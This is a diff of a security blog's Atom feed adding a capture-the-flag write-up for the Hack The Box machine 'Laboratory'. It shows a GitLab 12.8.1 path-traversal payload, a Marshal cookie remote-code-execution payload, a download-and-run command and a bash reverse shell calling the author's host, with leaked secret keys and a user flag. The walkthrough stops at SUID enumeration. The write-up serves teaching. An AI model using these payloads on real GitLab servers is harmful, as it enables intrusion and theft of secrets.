@@ -1,5 +1,217 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-16T09:20:00+02:00</updated><entry><title>HTB: Ready</title><link href="https://maggick.fr/2021/05/htb-ready.html" rel="alternate"></link><published>2021-05-16T09:20:00+02:00</published><updated>2021-05-16T09:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-ready.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-16T09:40:00+02:00</updated><entry><title>HTB: Laboratory</title><link href="https://maggick.fr/2021/05/htb-laboratory.html" rel="alternate"></link><published>2021-05-16T09:40:00+02:00</published><updated>2021-05-16T09:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-laboratory.html</id><summary type="html">&lt;p&gt;&lt;img alt="Laboratory Card" class="align-left" src="/media/2021.05/laboratory_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/298"&gt;Laboratory&lt;/a&gt; publish on
+November 14, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/73268"&gt;0xc45&lt;/a&gt;.
+This box is rated as an easy box. It implies mostly gitlab and a LFI
+vulnerability and an SUID binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/laboratory_card.png" alt="Laboratory Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/298"&gt;Laboratory&lt;/a&gt; publish on
+November 14, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/73268"&gt;0xc45&lt;/a&gt;.
+This box is rated as an easy box. It implies mostly gitlab and a LFI
+vulnerability and an SUID binary.&lt;/p&gt;
+
+
+&lt;h1 id="foothold"&gt;Foothold&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 22 (SSH), 80 and 443 (HTTP
+and HTTPS) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;Nmap&lt;/span&gt; &lt;span class="nt"&gt;7&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;91&lt;/span&gt; &lt;span class="nt"&gt;scan&lt;/span&gt; &lt;span class="nt"&gt;initiated&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;Nov&lt;/span&gt; &lt;span class="nt"&gt;26&lt;/span&gt; &lt;span class="nt"&gt;09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;49&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;27&lt;/span&gt; &lt;span class="nt"&gt;2020&lt;/span&gt; &lt;span class="nt"&gt;as&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;nmap&lt;/span&gt; &lt;span class="nt"&gt;-p-&lt;/span&gt; &lt;span class="nt"&gt;-sSV&lt;/span&gt; &lt;span class="nt"&gt;-oN&lt;/span&gt; &lt;span class="nt"&gt;nmap&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;129&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;47&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;132&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;Nmap&lt;/span&gt; &lt;span class="nt"&gt;scan&lt;/span&gt; &lt;span class="nt"&gt;report&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;129&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;47&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;132&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;Host&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;012s&lt;/span&gt; &lt;span class="nt"&gt;latency&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;Not&lt;/span&gt; &lt;span class="nt"&gt;shown&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;65532&lt;/span&gt; &lt;span class="nt"&gt;filtered&lt;/span&gt; &lt;span class="nt"&gt;ports&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;PORT&lt;/span&gt;    &lt;span class="nt"&gt;STATE&lt;/span&gt; &lt;span class="nt"&gt;SERVICE&lt;/span&gt;  &lt;span class="nt"&gt;VERSION&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;22&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt;  &lt;span class="nt"&gt;open&lt;/span&gt;  &lt;span class="nt"&gt;ssh&lt;/span&gt;      &lt;span class="nt"&gt;OpenSSH&lt;/span&gt; &lt;span class="nt"&gt;8&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2p1&lt;/span&gt; &lt;span class="nt"&gt;Ubuntu&lt;/span&gt; &lt;span class="nt"&gt;4ubuntu0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;1&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;Ubuntu&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;protocol&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt;  &lt;span class="nt"&gt;open&lt;/span&gt;  &lt;span class="nt"&gt;http&lt;/span&gt;     &lt;span class="nt"&gt;Apache&lt;/span&gt; &lt;span class="nt"&gt;httpd&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;41&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;443&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;tcp&lt;/span&gt; &lt;span class="nt"&gt;open&lt;/span&gt;  &lt;span class="nt"&gt;ssl&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt; &lt;span class="nt"&gt;Apache&lt;/span&gt; &lt;span class="nt"&gt;httpd&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;41&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="nt"&gt;Ubuntu&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;Service&lt;/span&gt; &lt;span class="nt"&gt;Info&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;laboratory&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;htb&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;OS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;CPE&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;cpe&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="nt"&gt;o&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;linux&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;linux_kernel&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nt"&gt;Service&lt;/span&gt; &lt;span class="nt"&gt;detection&lt;/span&gt; &lt;span class="nt"&gt;performed&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;Please&lt;/span&gt; &lt;span class="nt"&gt;report&lt;/span&gt; &lt;span class="nt"&gt;any&lt;/span&gt; &lt;span class="nt"&gt;incorrect&lt;/span&gt; &lt;span class="nt"&gt;results&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;https&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;#&lt;/span&gt; &lt;span class="nt"&gt;Nmap&lt;/span&gt; &lt;span class="nt"&gt;done&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;Nov&lt;/span&gt; &lt;span class="nt"&gt;26&lt;/span&gt; &lt;span class="nt"&gt;09&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;51&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;28&lt;/span&gt; &lt;span class="nt"&gt;2020&lt;/span&gt; &lt;span class="nt"&gt;--&lt;/span&gt; &lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;IP&lt;/span&gt; &lt;span class="nt"&gt;address&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="nt"&gt;host&lt;/span&gt; &lt;span class="nt"&gt;up&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;scanned&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="nt"&gt;120&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;73&lt;/span&gt; &lt;span class="nt"&gt;seconds&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The website either access with on the port 80 or 443 redirected to &lt;code&gt;https://laboratory.htb&lt;/code&gt;.
+So we add an entry to &lt;code&gt;/etc/hosts&lt;/code&gt;.
+We trying to access it again we got a certificate error as its supposed to be
+for &lt;code&gt;git.laboratory.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="ssl certificat" src="/media/content/2021.05/laboratory_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;Se we add another entry to our &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to it.&lt;/p&gt;
+&lt;h2 id="gitlab"&gt;gitlab&lt;/h2&gt;
+&lt;p&gt;This is a standard gitlab installation. We create an account and using the
+exploration function we found a public project that does not contains anything
+useful.&lt;/p&gt;
+&lt;p&gt;Looking at the help page we found that the version is &lt;code&gt;GitLab Community Edition 12.8.1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;While searching on Google we found a &lt;a href="https://hackerone.com/reports/827052"&gt;bug bounty report&lt;/a&gt;
+for this specific version that disclosed a LFI and a RCE.&lt;/p&gt;
+&lt;h3 id="lfi"&gt;LFI&lt;/h3&gt;
+&lt;p&gt;In order to execute the code on the gitlab server we first need to use the LFI
+to get &lt;code&gt;secrets.yml&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So as described in the &lt;a href="https://hackerone.com/reports/827052"&gt;bug bounty report&lt;/a&gt;
+we create two projects, one with an issue description containing the following
+link and we move it to the second project.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;That allow us to get the file content.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# This file is managed by gitlab-ctl. Manual changes will be&lt;/span&gt;
+&lt;span class="code-line"&gt;# erased! To change the contents below, edit /etc/gitlab/gitlab.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;# and run `sudo gitlab-ctl reconfigure`.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;---&lt;/span&gt;
+&lt;span class="code-line"&gt;production:&lt;/span&gt;
+&lt;span class="code-line"&gt;  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838&lt;/span&gt;
+&lt;span class="code-line"&gt;  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3&lt;/span&gt;
+&lt;span class="code-line"&gt;  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af&lt;/span&gt;
+&lt;span class="code-line"&gt;  openid_connect_signing_key: |&lt;/span&gt;
+&lt;span class="code-line"&gt;    -----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
+&lt;span class="code-line"&gt;    MIIJKQIBAAKCAgEA5LQnENotwu/SUAshZ9vacrnVeYXrYPJoxkaRc2Q3JpbRcZTu&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We need a gitlabshell to create the cookie that will allow use to execute the
+code on the box. We also need the same version as the one on the box.&lt;/p&gt;
+&lt;p&gt;Using docker and some &lt;a href="[https://www.howtoforge.com/how-to-install-gitlab-with-docker-on-ubuntu-2004"&gt;article&lt;/a&gt;
+we create a &lt;code&gt;docker-compose.yml&lt;/code&gt; that looks as follow.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;web:&lt;/span&gt;
+&lt;span class="code-line"&gt;  image: &amp;#39;gitlab/gitlab-ce:12.8.1-ce.0&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;  restart: always&lt;/span&gt;
+&lt;span class="code-line"&gt;  hostname: &amp;#39;gitlab.hakase-labs.io&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  environment:&lt;/span&gt;
+&lt;span class="code-line"&gt;    GITLAB_OMNIBUS_CONFIG: |&lt;/span&gt;
+&lt;span class="code-line"&gt;      # Add any other gitlab.rb configuration here, each on its own line&lt;/span&gt;
+&lt;span class="code-line"&gt;      #external_url &amp;#39;https://gitlab.hakase-labs.io&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;      gitlab_rails[&amp;#39;gitlab_shell_ssh_port&amp;#39;] = 2224&lt;/span&gt;
+&lt;span class="code-line"&gt;      #nginx[&amp;#39;redirect_http_to_https&amp;#39;] = true&lt;/span&gt;
+&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_certificate&amp;#39;] = &amp;quot;/etc/gitlab/ssl/fullchain.pem&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_certificate_key&amp;#39;] = &amp;quot;/etc/gitlab/ssl/privkey.pem&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;      #nginx[&amp;#39;ssl_dhparam&amp;#39;] = &amp;quot;/etc/gitlab/ssl/dhparams.pem&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  ports:&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;80:80&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;443:443&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;2224:22&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  volumes:&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/config:/etc/gitlab&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/logs:/var/log/gitlab&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/data:/var/opt/gitlab&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;    - &amp;#39;${GITLAB_HOME}/config/ssl:/etc/gitlab/ssl&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3 id="rce"&gt;RCE&lt;/h3&gt;
+&lt;p&gt;We got a shell on out gitlab docker and overwrite
+&lt;code&gt;/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml&lt;/code&gt; with the downloaded one.
+Then we use &lt;code&gt;gitlab-rails console&lt;/code&gt; to reproduce the lines in the
+&lt;a href="https://hackerone.com/reports/827052"&gt;hackerone report&lt;/a&gt;
+to create a Marshalled payload within a cookie. Our first payload is a simple
+&lt;code&gt;wget&lt;/code&gt; targeting our own python server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;request = ActionDispatch::Request.new(Rails.application.env_config)&lt;/span&gt;
+&lt;span class="code-line"&gt;request.env[&amp;quot;action_dispatch.cookies_serializer&amp;quot;] = :marshal&lt;/span&gt;
+&lt;span class="code-line"&gt;cookies = request.cookie_jar&lt;/span&gt;
+&lt;span class="code-line"&gt;irb(main):014:0&amp;gt; erb = ERB.new(&amp;quot;&amp;lt;%= `wget http://10.10.14.51:8000/p0wn` %&amp;gt;&amp;quot;)&lt;/span&gt;
+&lt;span class="code-line"&gt;depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &amp;quot;@result&amp;quot;, ActiveSupport::Deprecation.new)&lt;/span&gt;
+&lt;span class="code-line"&gt;cookies.signed[:cookie] = depr&lt;/span&gt;
+&lt;span class="code-line"&gt;puts cookies[:cookie]&lt;/span&gt;
+&lt;span class="code-line"&gt;BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then use &lt;code&gt;curl&lt;/code&gt; to send our request and got a hit on our web server.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -vvv -k &amp;#39;https://git.laboratory.htb/users/sign_in&amp;#39; -b &amp;quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYyNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGB3Z2V0IGh0dHA6Ly8xMC4xMC4xNC41MTo4MDAwL3Awd25gICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e58cf8e3ef8e1b016de9b83cac7627d48ec17c45&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then change our payload to download a "reverse shell" and execute it:
+&lt;code&gt;curl http://10.10.14.51:8000/rev.sh -o /tmp/rev.sh &amp;amp;&amp;amp; chmod 777 rev.sh &amp;amp;&amp;amp; bash /tmp/rev.sh&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The content of rev.sh is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.51/4242 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Our &lt;code&gt;netcat&lt;/code&gt; listener quickly catch a reverse shell as git.&lt;/p&gt;
+&lt;h2 id="getting-user"&gt;Getting user&lt;/h2&gt;
+&lt;p&gt;Using gitlab-rails console on the HTB machine and gitlab documentation about
+&lt;a href="https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html"&gt;gitlab-rails cheatsheet&lt;/a&gt;
+and &lt;a href="https://docs.gitlab.com/ee/development/permissions.html"&gt;projects' permissions&lt;/a&gt;
+we change the visibility of every projects on the gitlab instance to public.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;gitlab-rails console&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;GitLab:       12.8.1 (d18b43a5f5a) FOSS&lt;/span&gt;
+&lt;span class="code-line"&gt;GitLab Shell: 11.0.0&lt;/span&gt;
+&lt;span class="code-line"&gt;PostgreSQL:   10.12&lt;/span&gt;
+&lt;span class="code-line"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;Loading production environment (Rails 6.0.2)&lt;/span&gt;
+&lt;span class="code-line"&gt;Switch to inspect mode.&lt;/span&gt;
+&lt;span class="code-line"&gt;Project.update_all(visibility_level: 20)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;That allow us to discover a &lt;code&gt;securedocker&lt;/code&gt; project from the &lt;code&gt;dexter&lt;/code&gt; user
+containing a &lt;a href="https://git.laboratory.htb/dexter/securedocker/-/blob/master/dexter/.ssh/id_rsa"&gt;SSH private key&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Using this key we can connect as &lt;code&gt;dexter&lt;/code&gt; on the box and get the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh 10.129.60.56 -i id_rsa -ldexter&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:~$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=1000(dexter) gid=1000(dexter) groups=1000(dexter)&lt;/span&gt;
+&lt;span class="code-line"&gt;dexter@laboratory:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;a153ecab9310723fa79e5dc37487ef68&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;We start enumerating the box. We "quickly" found a suspect SUID binary
+&lt;code&gt;docker-security&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dexter@laboratory:/tmp/.plop$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 166056 Jul 15 00:17 /usr/bin/sudo&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44784 May 28  2020 /usr/bin/newgrp&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 67816 Apr  2  2020 /usr/bin/su&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 88464 May 28  2020 /usr/bin/gpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 85064 May 28  2020 /usr/bin/chfn&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 39144 Apr  2  2020 /usr/bin/umount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 53040 May 28  2020 /usr/bin/chsh&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 55528 Apr  2  2020 /usr/bin/mount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd&lt;/span&gt;
